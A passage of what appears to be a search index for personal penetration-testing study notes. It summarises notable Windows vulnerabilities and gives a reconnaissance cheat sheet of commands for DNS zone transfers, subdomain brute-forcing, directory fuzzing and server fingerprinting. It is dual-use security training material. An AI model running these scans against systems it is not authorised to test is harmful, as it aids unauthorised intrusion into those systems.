</ul>","tags":["privilege escalation","windows"]},{"location":"index-windows-privilege-escalation/#privilege-escalation-tools","title":"Privilege escalation tools","text":"<ul> <li>CrackMapexex.</li> <li>mimikatz.</li> </ul>","tags":["privilege escalation","windows"]},{"location":"index-windows-privilege-escalation/#prominent-windows-exploits","title":"Prominent Windows Exploits","text":"Vulnerability Description <code>MS08-067</code> MS08-067 was a critical patch pushed out to many different Windows revisions due to an SMB flaw. This flaw made it extremely easy to infiltrate a Windows host. It was so efficient that the Conficker worm was using it to infect every vulnerable host it came across. Even Stuxnet took advantage of this vulnerability. <code>Eternal Blue</code> MS17-010 is an exploit leaked in the Shadow Brokers dump from the NSA. This exploit was most notably used in the WannaCry ransomware and NotPetya cyber attacks. This attack took advantage of a flaw in the SMB v1 protocol allowing for code execution. EternalBlue is believed to have infected upwards of 200,000 hosts just in 2017 and is still a common way to find access into a vulnerable Windows host. <code>PrintNightmare</code> A remote code execution vulnerability in the Windows Print Spooler. With valid credentials for that host or a low privilege shell, you can install a printer, add a driver that runs for you, and grants you system-level access to the host. This vulnerability has been ravaging companies through 2021. 0xdf wrote an awesome post on it\u00a0here. <code>BlueKeep</code> CVE 2019-0708 is a vulnerability in Microsoft's RDP protocol that allows for Remote Code Execution. This vulnerability took advantage of a miss-called channel to gain code execution, affecting every Windows revision from Windows 2000 to Server 2008 R2. <code>Sigred</code> CVE 2020-1350 utilized a flaw in how DNS reads SIG resource records. It is a bit more complicated than the other exploits on this list, but if done correctly, it will give the attacker Domain Admin privileges since it will affect the domain's DNS server which is commonly the primary Domain Controller. <code>SeriousSam</code> CVE 2021-36924 exploits an issue with the way Windows handles permission on the\u00a0<code>C:\\Windows\\system32\\config</code>\u00a0folder. Before fixing the issue, non-elevated users have access to the SAM database, among other files. This is not a huge issue since the files can't be accessed while in use by the pc, but this gets dangerous when looking at volume shadow copy backups. These same privilege mistakes exist on the backup files as well, allowing an attacker to read the SAM database, dumping credentials. <code>Zerologon</code> CVE 2020-1472 is a critical vulnerability that exploits a cryptographic flaw in Microsoft\u2019s Active Directory Netlogon Remote Protocol (MS-NRPC). It allows users to log on to servers using NT LAN Manager (NTLM) and even send account changes via the protocol. The attack can be a bit complex, but it is trivial to execute since an attacker would have to make around 256 guesses at a computer account password before finding what they need. This can happen in a matter of a few seconds.","tags":["privilege escalation","windows"]},{"location":"information-gathering/","title":"Information gathering","text":"Sources for these notes <ul> <li>Hack The Box: Penetration Testing Learning Path</li> <li>INE eWPT2 Preparation course</li> <li>OWASP Web Security Testing Guide 4.2 &gt; 1. Information Gathering </li> <li>My own notes coming from experience pentesting.</li> </ul>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#methodology","title":"Methodology","text":"<p>Information gathering is typically broken down into two types: </p> <ul> <li>Passive information gathering - Involves gathering as much information as possible without actively engaging with the target. </li> <li>Active information gathering/Enumeration - Involves gathering as much information as possible by actively engaging with the target system. (You will require authorization in order to perform active information gathering).</li> </ul> Passive Information Gathering Active Information Gathering/Enumeration Identifying domain names and domain ownership information. Identify website content structure. Discovering hidden/disallowed files and directories. Downloading &amp; analyzing website/web app source code. Identifying web server IP addresses &amp; DNS records. Port scanning &amp; service discovery. Identifying web technologies being used on target sites. Web server fingerprinting. WAF detection. Web application scanning. Identifying subdomains. DNS Zone Transfers. Identify website content structure. Subdomain enumeration via Brute-Force.","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#1-passive-information-gathering","title":"1. Passive information gathering","text":"","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#11-fingerprint-web-server","title":"1.1. Fingerprint Web Server","text":"<p>Or Passive server enumeration.</p> <p>OWASP Web Security Testing Guide 4.2 &gt; 1. Information Gathering &gt; 1.2. Fingerprint Web Server</p> ID Link to Hackinglife Link to OWASP Objectives 1.2 WSTG-INFO-02 Fingerprint Web Server - Determine the version and type of a running web server to enable further discovery of any known vulnerabilities.","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#host-command","title":"host command","text":"<p>DNS lookup utility. </p> <pre><code>host domain.com\n</code></pre>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#whois-command","title":"whois command","text":"<p>WHOIS is a query and response protocol that is used to query databases that store the registered users or organizations of an internet resource like a domain name or an IP address block.</p> <p>WHOIS lookups can be performed through the command line interface via the whois client or through some third party web-based tools to lookup the domain ownership details from different databases.</p> <pre><code> whois $TARGET\n</code></pre> <pre><code>whois.exe &lt;TARGET&gt;\n</code></pre>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#netcraft","title":"netcraft","text":"<p>Netcraft can offer us information about the servers without even interacting with them, and this is something valuable from a passive information gathering point of view. We can use the service by visiting <code>https://sitereport.netcraft.com</code> and entering the target domain. We need to pay special attention to the latest IPs used. Sometimes we can spot the actual IP address from the webserver before it was placed behind a load balancer, web application firewall, or IDS, allowing us to connect directly to it if the configuration.</p> <p>More issues fired up by netcraft: cms, server programming,...</p>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#censys","title":"censys","text":"<p>https://search.censys.io/</p>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#shodan","title":"Shodan","text":"<ul> <li>https://www.shodan.io/</li> </ul>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#wayback-machine","title":"Wayback machine","text":"<p>We can access several versions of these websites using the Wayback Machine to find old versions that may have interesting comments in the source code or files that should not be there.</p> <p>We can also use the tool waybackurls to inspect URLs saved by Wayback Machine and look for specific keywords. Installation:</p> <pre><code>go install github.com/tomnomnom/waybackurls@latest\n</code></pre> <p>Basic usage:</p> <pre><code>waybackurls -dates https://example.com &gt; waybackurls.txt\n\ncat waybackurls.txt\n</code></pre>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#12-passive-dns-enumeration","title":"1.2. Passive DNS enumeration","text":"<p>A valuable resource for this information is the Domain Name System (DNS). We can query DNS to identify the DNS records associated with a particular domain or IP address.</p> <ul> <li>Complete DNS enumeration guide: definition and techniques.</li> </ul> <p>Some if these tools can also be used in Active DNS enumerations.</p> <p>Worth trying: DNSRecon and https://domain.glass/</p> Tool + Cheat sheet What it does Google dorks Google hacking, also named Google dorking, is a hacker technique that uses Google Search and other Google applications to find security holes in the configuration and computer code that websites are using. crt.sh It collects information about SSL certificates. If you visit a domain and it contains a certificate you can extract other subdomain by using the View Certificate functionality. dnscan Python wordlist-based DNS subdomain scanner. DNSRecon Preinstalled with Linux: dsnrecon is a simple python script that enables to gather  DNS-oriented  information on a given target. dnsdumpster.com DNSdumpster.com is a FREE domain research tool that can discover hosts related to a domain. Finding visible hosts from the attackers perspective is an important part of the security assessment process. https://domain.glass/ viewdns.info domaintools","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#13-reviewing-server-metafiles","title":"1.3. Reviewing server metafiles","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 1. Information Gathering &gt; 1.5. Review Webpage content for Information Leakage</p> ID Link to Hackinglife Link to OWASP Objectives 1.5 WSTG-INFO-05 Review Webpage Content for Information Leakage - Review webpage comments, metadata, and redirect bodies to find any information leakage.  - Gather JavaScript files and review the JS code to better understand the application and to find any information leakage.  - Identify if source map files or other front-end debug files exist. <p>Some of these files:</p> <ul> <li>robots.txt</li> <li>sitemap.xml</li> <li>security.txt (proposed standard which allows websites to define security policies and contact details.)</li> <li>human.txt (initiative for knowing the people behind a website.)</li> </ul>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#14-conduct-search-search-engine-discovery","title":"1.4. Conduct search Search Engine Discovery","text":"<p>Dorking</p> <ul> <li>Complete google dork guide.</li> <li>Complete github dork guide.</li> </ul> <p>OWASP Web Security Testing Guide 4.2 &gt; 1. Information Gathering &gt; 1.1. Conduct search engine discovery reconnaissance for information leakage</p> ID Link to Hackinglife Link to OWASP Objectives 1.1 WSTG-INFO-01 Conduct Search Engine Discovery Reconnaissance for Information Leakage - Identify what sensitive design and configuration information of the application, system, or organization is exposed directly (on the organization's website) or indirectly (via third-party services).","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#15-cloud-resources","title":"1.5. Cloud resources","text":"<p>Buckets, blob, ...: https://buckets.grayhatwarfare.com/</p>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#greyhat-warfare","title":"Greyhat Warfare","text":"<p>Monitoring breaches in buckets and storage accounts in the cloud.</p> <p>Greyhat Warfare</p>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#trufflehog","title":"Trufflehog","text":"<p>A tool for continuously monitoring\u00a0Git, Jira, Slack, Confluence, Microsoft Teams, Sharepoint, and more. Trufflehog</p>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#16-fingerprint-web-application-technology-and-frameworks","title":"1.6. Fingerprint web application technology and frameworks","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 1. Information Gathering &gt; 1.8. Fingerprint Web Application Framework</p> ID Link to Hackinglife Link to OWASP Objectives 1.8 WSTG-INFO-08 Fingerprint Web Application Framework - Fingerprint the components being used by the web applications.  - Find the type of web application framework/CMS from HTTP headers, Cookies, Source code, Specific files and folders, Error message. <p>If we discover the webserver behind the target application, it can give us a good idea of what operating system is running on the back-end server. </p> <p>For instance:</p> <ul> <li>IIS 6.0: Windows Server 2003</li> <li>IIS 7.0-8.5: Windows Server 2008 / Windows Server 2008R2</li> <li>IIS 10.0 (v1607-v1709): Windows Server 2016</li> <li>IIS 10.0 (v1809-): Windows Server 2019</li> </ul> <p>Although this is usually correct when dealing with Windows, we can not be sure in the case of Linux or BSD-based distributions as they can run different web server versions</p> <p>How to spot a web server?</p>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#http-headers","title":"HTTP headers","text":"<p>X-Powered-By and cookies:  - .NET: <code>ASPSESSIONID&lt;RANDOM&gt;=&lt;COOKIE_VALUE&gt;</code> - PHP: <code>PHPSESSID=&lt;COOKIE_VALUE&gt;</code> - JAVA: <code>JSESSION=&lt;COOKIE_VALUE&gt;</code></p> <p>More manual techniques on  OWASP 4.2: WSTG-INFO-08</p> <p>Banner Grabbing / Web Server Headers</p>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#whatweb","title":"whatweb","text":"<p>whatweb**.</p> <pre><code>whatweb -a3 https://www.example.com -v\n# -a3: aggression level 3\n# -v: verbose mode\n</code></pre>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#wappalyzer","title":"Wappalyzer","text":"<p>Wappalyzer**</p>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#wafw00f","title":"wafw00f","text":"<p>wafw00f**:</p> <pre><code>wafw00f -v https://www.example.com\n\n# -a: check all possible WAFs in place instead of stopping scanning at the first match.\n# -i: read targets from an input file \n# -p proxy the requests \n</code></pre>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#aquatone","title":"Aquatone","text":"<p>Aquatone</p> <pre><code>cat example_of_list.txt | aquatone -out ./aquatone -screenshot-timeout 1000\n</code></pre>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#builtwith","title":"BuiltWith","text":"<p>Addons BuiltWith: BuiltWith\u00ae covers 93,551+ internet technologies which include analytics, advertising, hosting, CMS and many more.</p>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#curl","title":"Curl","text":"<p>Curl:</p> <pre><code>curl -IL https://&lt;TARGET&gt;\n# -I: --head (HTTP  FTP  FILE) Fetch the headers only!\n# -L, --location: (HTTP) If the server reports that the requested page has moved to a different location (indicated with a Location: header and a 3XX response  code),  this  option  will make  curl  redo the request on the new place. If used together with -i, --include or -I, --head, headers from all requested pages will be shown. \n</code></pre>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#nmap","title":"nmap","text":"<p>nmap:</p> <pre><code>sudo nmap -v $ip --script banner.nse\n</code></pre>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#17-waf-detection","title":"1.7. WAF detection","text":"","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#wafw00f_1","title":"wafw00f","text":"<p>wafw00f**:</p> <pre><code>wafw00f -v https://www.example.com\n\n# -a: check all possible WAFs in place instead of stopping scanning at the first match.\n# -i: read targets from an input file \n# -p proxy the requests \n</code></pre>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#nmap_1","title":"nmap","text":"<p>nmap:</p> <pre><code>nmap -p443 --script http-waf-detect &lt;host&gt;\n</code></pre>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#18-code-analysis-httrack-and-eyewitness","title":"1.8. Code analysis: HTTRack and EyeWitness","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 1. Information Gathering &gt; 1.7. Map Execution Paths through applications</p> ID Link to Hackinglife Link to OWASP Objectives 1.7 WSTG-INFO-07 Map Execution Paths Through Application - Map the target application and understand the principal workflows.  - Use HTTP(s) Proxy Spider/Crawler feature aligned with application walkthrough","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#httrack","title":"HTTRack","text":"<p>HTTRack tutorial</p> <p>Create a folder for replicating in it your target.</p> <pre><code>mkdir targetsite\nhttrack domain.com  targetsite/\n</code></pre> <p>Interactive mode:</p> <pre><code>httrack\n</code></pre>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#eyewitness","title":"EyeWitness","text":"<p>EyeWitness tutorial</p> <p>First, create a file with the target domains, like for instance, listOfdomains.txt.</p> <p>Then, run:</p> <pre><code>eyewitness --web -f listOfdomains.txt -d path/to/save/\n</code></pre> <p>After that you will get a report.html file with the request and a screenshot of those domains.</p> <pre><code># Proxing the request via BurpSuite\neyewitness --web -f listOfdomains.txt -d path/to/save/ --proxy-ip 127.0.0.1 --proxy-port 8080\n</code></pre>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#19-crawlers","title":"1.9. Crawlers","text":"<p>Crawling is the process of navigating around the web application, following links, submitting forms and logging in (where possible) with the objective of mapping out and cataloging the web application and the navigational paths within it. </p> <p>Crawling is typically passive as engagement with the target is done via what is publicly accessible, we can utilize Burp Suite\u2019s passive crawler to help us map out the web application to better understand how it is setup and how it works.</p> <ul> <li>BurpSuite Community edition has only Crawler feature available. For spidering, you need Pro edition. Burp Suite Spider</li> <li>OWASP ZAP (Zed Attack Proxy): ZAP is a free, open-source web application security scanner. It can be used in automated and manual modes and includes a spider component to crawl web applications and identify potential vulnerabilities. has both Spider and Crawler features available.</li> <li><code>Scrapy (Python Framework)</code>: Scrapy is a versatile and scalable Python framework for building custom web crawlers. It provides rich features for extracting structured data from websites, handling complex crawling scenarios, and automating data processing. Its flexibility makes it ideal for tailored reconnaissance tasks.</li> <li><code>Apache Nutch (Scalable Crawler)</code>: Nutch is a highly extensible and scalable open-source web crawler written in Java. It's designed to handle massive crawls across the entire web or focus on specific domains. While it requires more technical expertise to set up and configure, its power and flexibility make it a valuable asset for large-scale reconnaissance projects.</li> </ul>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#scrapy","title":"Scrapy","text":"<p><code>Scrapy (Python Framework)</code>: Scrapy is a versatile and scalable Python framework for building custom web crawlers. It provides rich features for extracting structured data from websites, handling complex crawling scenarios, and automating data processing. Its flexibility makes it ideal for tailored reconnaissance tasks.</p> <pre><code># Installation\npip3 install scrapy\n</code></pre>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#reconspider","title":"ReconSpider","text":"<pre><code># Installation\nwget -O ReconSpider.zip https://academy.hackthebox.com/storage/modules/144/ReconSpider.v1.2.zip\n\nunzip ReconSpider.zip \n</code></pre> <pre><code># Basic usage\npython3 ReconSpider.py http://domain.com\n</code></pre> <p>After running\u00a0<code>ReconSpider.py</code>, the data will be saved in a JSON file,\u00a0<code>results.json</code>. This file can be explored using any text editor. </p>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#2-active-information-gathering","title":"2. Active  information gathering","text":"","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#21-enumerate-applications-and-services-on-webserver","title":"2.1. Enumerate applications and services on Webserver","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 1. Information Gathering &gt; 1.4. Enumerate Applications on Webserver</p> ID Link to Hackinglife Link to OWASP Objectives 1.4 WSTG-INFO-04 Enumerate Applications on Webserver - Enumerate the applications within the scope that exist on a web server.  - Find applications hosted in the webserver (Virtual hosts/Subdomain), non-standard ports, DNS zone transfers <p>Hostname discovery</p> <pre><code>nmap --script smb-os-discovery $ip\n</code></pre> <p>Scanning the IP looking for services:</p> <pre><code>nmap -sV -sC -- &lt;target&gt;\n</code></pre>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#22-web-server-fingerprinting","title":"2.2. Web Server Fingerprinting","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 1. Information Gathering &gt; 1.2. Fingerprint Web Server</p> ID Link to Hackinglife Link to OWASP Objectives 1.2 WSTG-INFO-02 Fingerprint Web Server - Determine the version and type of a running web server to enable further discovery of any known vulnerabilities.","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#http-headers-and-source-code","title":"HTTP headers and source code","text":"<p>HTTP headers and HTML Source code (with Burpsuite and curl).  Or CRTL-u on the browser to see the source code.</p> <ul> <li>Note the response header  <code>Server</code>, <code>X-Powered-By</code>, or <code>X-Generator</code> as well.</li> <li>Identify framework specific cookies. For instance, the cookie <code>CAKEPHP</code> for php.</li> <li>Review the source code and identify <code>&lt;meta&gt;</code> or attributes with typical patterns from some servers (and/or frameworks).</li> </ul>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#nmap_2","title":"nmap","text":"<p>Conduct an scan</p> <pre><code>nmap -sV -F target\n</code></pre> <p>If a server version found is potentially vulnerable, use searchsploit:</p> <pre><code>searchsploit apache 2.4.18\n</code></pre>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#metasploit","title":"metasploit","text":"<p>Additionally you can use metasploit:</p> <pre><code>use auxiliary/scanner/http_version\n</code></pre>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#whatweb_1","title":"whatweb","text":"<p>whatweb.</p> <pre><code># version of web servers, supporting frameworks, and applications\nwhatweb $ip\nwhatweb &lt;hostname&gt;\n\n# Automate web application enumeration across a network.\nwhatweb --no-errors $ip/24\n</code></pre>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#nikto","title":"Nikto","text":"<p>nikto.</p> <pre><code>nikto -h domain.com -o nikto.html -Format html\n\n\nnikto -h http://domain.com/index.php?page=target-page.php -Tuning 5 -Display V\n# -Display V : turn verbose mode on\n# -Tuning 5 : Level 5 is considered aggressive, covering a wide range of tests but may also increase the likelihood of false positives. \n</code></pre>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#23-well-known-uris","title":"2.3. # Well-Known URIs","text":"<p>OWASP</p> <p>OWASP Web Security Testing Guide 4.2 &gt; 1. Information Gathering &gt; 1.3. Review Webserver Metafiles for Information Leakage</p> ID Link to Hackinglife Link to OWASP Objectives 1.3 WSTG-INFO-03 Review Webserver Metafiles for Information Leakage - Identify hidden or obfuscated paths and functionality through the analysis of metadata files (robots.txt, <code>&lt;META&gt;</code> tag, sitemap.xml) - Extract and map other information that could lead to a better understanding of the systems at hand. <p>The\u00a0<code>.well-known</code>\u00a0standard, defined in\u00a0RFC 8615, serves as a standardized directory within a website's root domain. This designated location, typically accessible via the\u00a0<code>/.well-known/</code>\u00a0path on a web server, centralizes a website's critical metadata, including configuration files and information related to its services, protocols, and security mechanisms.</p> URI Suffix Description Status Reference <code>security.txt</code> Contains contact information for security researchers to report vulnerabilities. Permanent RFC 9116 <code>/.well-known/change-password</code> Provides a standard URL for directing users to a password change page. Provisional https://w3c.github.io/webappsec-change-password-url/#the-change-password-well-known-uri <code>openid-configuration</code> Defines configuration details for OpenID Connect, an identity layer on top of the OAuth 2.0 protocol. Permanent http://openid.net/specs/openid-connect-discovery-1_0.html <code>assetlinks.json</code> Used for verifying ownership of digital assets (e.g., apps) associated with a domain. Permanent https://github.com/google/digitalassetlinks/blob/master/well-known/specification.md <code>mta-sts.txt</code> Specifies the policy for SMTP MTA Strict Transport Security (MTA-STS) to enhance email security. Permanent RFC 8461","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#24-directoryfile-enumeration","title":"2.4. Directory/File enumeration","text":"","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#nmap_3","title":"nmap","text":"<pre><code>nmap -sV -p80 --script=http-enum &lt;target&gt;\n</code></pre>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#dirb","title":"dirb","text":"<p>Cheat sheet with dirb.</p> <pre><code>dirb http://domain.com /usr/share/metasploit-framework/data/wordlists/directory.txt\n</code></pre>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#gobuster","title":"gobuster","text":"<p>Gobuster:</p> <pre><code>gobuster dir -u &lt;exact target url&gt; -w &lt;/path/dic.txt&gt; -b 403,4.4 -x .php,.txt -r \n# -b: exclude from results an specific http response`\n# -r: follow redirects\n# -x: add to the path provided by dictionary these extensions\n</code></pre>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#ffuf","title":"Ffuf","text":"<p>Ffuf:</p> <pre><code>ffuf -w /path/to/wordlist -u https://target/FUZZ\n\n# Assuming that the default virtualhost response size is 4242 bytes, we can filter out all the responses of that size (`-fs 4242`)while fuzzing the Host - header:\nffuf -w /path/to/vhost/wordlist -u https://target -H \"Host: FUZZ\" -fs 4242\n\n# Enumerating directories and folders:\nffuf -recursion -recursion-depth 1 -u http://$ip/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt\n# -recursion: activates the recursive scan\n# -recursion-depth 1: specifies the maximum depth to scan\n\n# fuzz a combination of folder names, with a wordlist of possible files and a dictionary of extensions\nffuf -w ./folders.txt:FOLDERS,./wordlist.txt:WORDLIST,./extensions.txt:EXTENSIONS -u http://$ip/FOLDERS/WORDLISTEXTENSIONS\n</code></pre>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#wfuzz","title":"Wfuzz","text":"<p>Wfuzz</p>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#feroxbuster","title":"feroxbuster","text":"<p>feroxbuster</p>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#amass","title":"amass","text":"<p>amass</p> <pre><code>amass enum -active -d crapi.apisec.ai  -ip -brute -dir path/to/save/results/\n# enum: Perform enumerations and network mapping\n# -active: Attempt zone transfer and certificate name grabs, among others.\n# -ip: Show ip addresses of cached subdomais.\n# -brute: Perform a brute force dns attack.\n\namass enum -passive -d crapi.apisec.ai -src  -dir path/to/save/results/\n# enum: Perform enumerations and network mapping.\n# -pasive: Performs passive scan\n# src: display sources of the host domain.\n# -dir: Specify a folder to save results.\n\namass intel -d crapi.apisec.ai\n# intel: Discover targets for enumerations. It actively automate active enumeration. \n</code></pre> <p>Some flags:</p> <pre><code>-active: Attempt zone transfer and certificate name grabs.\n-pasive: Passive fingerprinting.\n-bl: Blacklist of subdomain names that will not be investigated\n-d: to specify a domain\n-ip: Show ip addresses of cached subdomais.\n\u2013include-unresolvable: output DNS names that did not resolve.\n-o file.txt: To output the result into a file\n-w: path to a different wordlist file\n</code></pre>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#spidering-with-owasp-zap","title":"Spidering with OWASP ZAP","text":"<p>Spidering is an active technique. It's the process of automatically discovering new resources (URLs) on a web application/site. It typically begins with a list of target URLs called seeds, after which the  spider will visit the URLs and identified hyperlinks in the page and adds them to the list of URLs to visit and repeats the process recursively.</p> <p>Spidering can be quite loud and as a result, it is typically considered to be an active information gathering technique.</p> <p>We can utilize OWASP ZAP\u2019s Spider to automate the process of spidering a web application to map out the web application and learn more about how the site is laid out and how it works.</p> <p>BurpSuite Community edition has only Crawler feature available. For spidering, you need Pro edition.</p> <p>OWASP Zap has both Spider and Crawler features available.</p>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#25-active-dns-enumeration","title":"2.5. Active DNS enumeration","text":"<p>Domain Name System (DNS) is a protocol that is used to resolve domain names/hostnames to IP addresses. During the early days of the internet, users would have to remember the IP addresses of the sites that they wanted to visit, DNS resolves this issue by mapping domain names (easier to recall) to their respective IP addresses. </p> <p>A DNS server (nameserver) is like a telephone directory that contains domain names and their corresponding IP addresses. A plethora of public DNS servers have been set up by companies like Cloudflare (1.1.1.1) and Google (8.8.8.8). These DNS servers contain the records of almost all domains on the internet.</p> <p>DNS interrogation is the process of enumerating DNS records for a specific domain. The objective of DNS interrogation is to probe a DNS server to provide us with DNS records for a specific domain. This process can provide us with important information like the IP address of a domain, subdomains, mail server addresses etc.</p> <p>More about DNS enumeration.</p> Tool + Cheat sheet What it does dnsenum multithreaded perl script to enumerate DNS information of a domain and to discover non-contiguous ip blocks. dig discover non-contiguous ip blocks. fierce DNS scanner that helps locate non-contiguous IP space and hostnames. dnscan Python wordlist-based DNS subdomain scanner. gobuster For brute force enumerations. nslookup . amass In depth DNS Enumeration and network mapping.","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#dnsenum","title":"dnsenum","text":"<p>dnsenum Multithreaded perl script to enumerate DNS information of a domain and to discover non-contiguous ip blocks.  Used for active fingerprinting:</p> <pre><code>dnsenum domain.com\n</code></pre> <p>One cool thing about dnsenum is that it can perform dns transfer zone, like [dig]](dig.md). dnsenum performs DNS brute force with /usr/share/dnsenum/dns.txt.</p>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#dig","title":"dig","text":"<p>Additionally, see dig axfr. </p> <p>dig (More complete cheat sheet: dig)</p> <pre><code>#Syntax for dns transferring a zone\ndig axfr @nameserver example.com\n\n# Get email of administrator of the domain\ndig soa www.example.com\n# The email will contain a (.) dot notation instead of @\n\n# ENUMERATION\n# List nameservers known for that domain\ndig ns example.com @$ip\n# -ns: other name servers are known in NS record\n#  `@` character specifies the DNS server we want to query.\n\n# View all available records\ndig any example.com @$ip\n\n# Display version. query a DNS server's version using a class CHAOS query and type TXT. However, this entry must exist on the DNS server.\ndig CH TXT version.bind $ip\n</code></pre>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#fierce","title":"Fierce","text":"<p>Fierce (More complete cheat sheet: fierce)</p> <pre><code># Perform a dns transfer using a wordlist againts domain.com\nfierce -dns domain.com \n</code></pre>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#dnscan","title":"DNScan","text":"<p>DNScan (More complete cheat sheet: DNScan): Python wordlist-based DNS subdomain scanner. The script will first try to perform a zone transfer using each of the target domain's nameservers.</p> <pre><code>dnscan.py (-d \\&lt;domain\\&gt; | -l \\&lt;list\\&gt;) [OPTIONS]\n# Mandatory Arguments\n#    -d  --domain                              Target domain; OR\n#    -l  --list                                Newline separated file of domains to scan\n</code></pre>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#gobuster_1","title":"gobuster","text":"<p>gobuster (More complete cheat sheet: gobuster)</p> <pre><code>gobuster dns -d &lt;DOMAIN (without http)&gt; -w /usr/share/SecLists/Discovery/DNS/namelist.txt\n</code></pre>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#nslookup","title":"nslookup","text":"<p>nslookup (More complete cheat sheet: nslookup)</p> <pre><code># Query `A` records by submitting a domain name: default behaviour\nnslookup $TARGET\n\n# We can use the `-query` parameter to search specific resource records\n# Querying: A Records for a Subdomain\nnslookup -query=A $TARGET\n\n# Querying: PTR Records for an IP Address\nnslookup -query=PTR 31.13.92.36\n\n# Querying: ANY Existing Records\nnslookup -query=ANY $TARGET\n\n# Querying: TXT Records\nnslookup -query=TXT $TARGET\n\n# Querying: MX Records\nnslookup -query=MX $TARGET\n\n#  Specify a nameserver if needed by adding `@&lt;nameserver/IP&gt;` to the command\n</code></pre>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#26-subdomain-enumeration","title":"2.6. Subdomain enumeration","text":"<p><code>Subdomain enumeration</code>\u00a0is the process of systematically identifying and listing these subdomains. From a DNS perspective, subdomains are typically represented by\u00a0<code>A</code>\u00a0(or\u00a0<code>AAAA</code>\u00a0for IPv6) records, which map the subdomain name to its corresponding IP address. Additionally,\u00a0<code>CNAME</code>\u00a0records might be used to create aliases for subdomains, pointing them to other domains or subdomains. </p> <p>Using Sec wordlist:</p> <pre><code>for sub in $(cat /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.example.com @$ip | grep -v ';\\|SOA' | sed -r '/^\\s*$/d' | grep $sub | tee -a subdomains.txt;done\n</code></pre>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#sublist3r","title":"Sublist3r","text":"<p>Sublist3r  enumerates ubdomains using many search engines such as Google, Yahoo, Bing, Baidu and Ask. Sublist3r also enumerates subdomains using Netcraft, Virustotal, ThreatCrowd, DNSdumpster and ReverseDNS. Easily blocked by Google.</p> <pre><code>python3 sublist3r.py -d example.com -o file.txt\n# -d: Specify the domain.\n# -o file.txt: It prints the results to a file\n# -b: Enable the bruteforce module. This built-in module relies on the names.txt wordlist. To find it, use: locate names.txt (you can edit it).\n\n# Select an engine for enumeration, for instance, google.\npython3 sublist3r.py -d example.com -e google\n</code></pre>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#fierce_1","title":"fierce","text":"<pre><code># Brute force subdomains with a seclist\nfierce --domain domain.com --subdomain-file fierce-hostlist.txt\n</code></pre>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#gobuster_2","title":"gobuster","text":"<p>Gobuster:</p> <pre><code>gobuster vhost -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u &lt;exact target url&gt;\n# vhost : Uses VHOST for brute-forcing\n# -w : Path to the wordlist\n# -u : Specify the URL\n</code></pre>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#wfuzz_1","title":"wfuzz","text":"<p>Wfuzz:</p> <pre><code>wfuzz -c --hc 404 -t 200 -u https://nunchucks.htb/ -w /usr/share/dirb/wordlists/common.txt -H \"Host: FUZZ.nunchucks.htb\" --hl 